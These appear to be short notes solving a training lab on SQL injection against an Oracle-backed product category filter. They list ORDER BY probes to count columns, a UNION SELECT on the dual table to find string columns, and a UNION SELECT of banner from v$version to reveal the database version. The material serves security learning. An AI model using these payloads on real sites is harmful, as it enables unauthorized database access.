Lab: SQL injection attack, querying the database type and version on Oracle
Vuln : product category filter.
Task : Display version of database.

Database : Oracle

' Order by 1--
' Order by 2--
' Order by 3--  error hence 2 columns

string columns: ' Union select 'a', NUll from dual-- -> dual is default table in every oracle DB.

' Union select banner,null from v$version-- : gives version of database of oracle.
